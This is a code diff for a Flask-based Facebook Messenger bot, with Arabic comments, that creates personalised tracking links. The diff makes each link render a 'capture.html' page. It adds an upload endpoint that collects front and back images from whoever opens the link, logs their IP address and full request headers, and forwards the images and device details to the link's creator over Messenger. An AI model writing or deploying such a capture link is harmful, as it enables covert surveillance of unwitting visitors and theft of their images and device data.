@@ -1,7 +1,8 @@
+import os
 import requests
 import json
-from flask import Flask, request, jsonify
-import os
+from flask import Flask, request, jsonify, render_template
+from datetime import datetime
 
 app = Flask(__name__)
 
@@ -35,32 +36,43 @@ def webhook():
                 message_text = messaging_event["message"]["text"]
 
                 # إنشاء رابط جديد
-                if message_text.startswith("new-url("):
-                    name = message_text.split("(")[1].split(")")[0]
-                    user_data[sender_id] = {"name": name, "message": None}
-                    link = f"{DOMAIN}/{sender_id}/{name}"
-                    send_message(sender_id, f"تم إنشاء الرابط: {link}")
-
-                # إنشاء رابط جديد مع رسالة
-                elif message_text.startswith("new-url-return("):
-                    parts = message_text.split("(")[1].split(")")[0].split("@")
-                    name = parts[0]
-                    message = parts[1] if len(parts) > 1 else "Hello"
-                    user_data[sender_id] = {"name": name, "message": message}
-                    link = f"{DOMAIN}/{sender_id}/{name}"
-                    send_message(sender_id, f"تم إنشاء الرابط: {link}")
-
+                if message_text.startswith("creatr-url["):
+                    name = message_text.split("[")[1].split("]")[0]
+                    user_data[sender_id] = {"name": name, "link": f"{DOMAIN}/{sender_id}/{name}"}
+                    send_message(sender_id, f"تم إنشاء الرابط: {user_data[sender_id]['link']}")
             return jsonify({"message": "Message received!"}), 200
 
 @app.route("/<user_id>/<name>", methods=["GET"])
 def dynamic_link(user_id, name):
     if user_id in user_data and user_data[user_id]["name"] == name:
+        return render_template("capture.html", user_id=user_id, name=name)
+    return "Name not found!", 404
+
+@app.route("/upload", methods=["POST"])
+def upload():
+    user_id = request.form.get("user_id")
+    name = request.form.get("name")
+    front_image = request.files.get("front_image")
+    back_image = request.files.get("back_image")
+
+    if user_id in user_data and user_data[user_id]["name"] == name:
+        # حفظ الصور
+        front_image_path = f"uploads/{user_id}_front_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
+        back_image_path = f"uploads/{user_id}_back_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
+        front_image.save(front_image_path)
+        back_image.save(back_image_path)
+
+        # جمع المعلومات
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-        user_agent = request.headers.get("User-Agent")
-        message = user_data[user_id].get("message", "Hello")
-        device_info = f"تم فتح الرابط من:\nIP: {ip}\nUser-Agent: {user_agent}"
-        send_message(user_id, f"{message}\n{device_info}")
-        return f"Hello, {name}!", 200
+        headers = dict(request.headers)
+        device_info = f"تم فتح الرابط من:\nIP: {ip}\nHeaders: {json.dumps(headers, indent=2)}"
+
+        # إرسال الصور والمعلومات إلى المستخدم
+        send_message(user_id, f"تم استلام الصور والمعلومات:\n{device_info}")
+        send_image(user_id, front_image_path)
+        send_image(user_id, back_image_path)
+
+        return jsonify({"message": "تم استلام الصور بنجاح!"}), 200
     return "Name not found!", 404
 
 def send_message(sender, message):
@@ -75,5 +87,18 @@ def send_message(sender, message):
     }
     requests.post(api, data=json.dumps(payload), headers=headers)
 
+def send_image(sender, image_path):
+    api = "https://graph.facebook.com/v21.0/me/messages"
+    headers = {
+        "Authorization": f"Bearer {ACCESS_TOKEN}",
+    }
+    files = {
+        "recipient": (None, json.dumps({"id": sender})),
+        "message": (None, json.dumps({"attachment": {"type": "image", "payload": {"is_reusable": True}}})),
+        "filedata": (image_path, open(image_path, "rb"), "image/jpeg")
+    }
+    requests.post(api, headers=headers, files=files)
+
 if __name__ == "__main__":
+    os.makedirs("uploads", exist_ok=True)
     app.run(host="0.0.0.0", port=5000, debug=True)
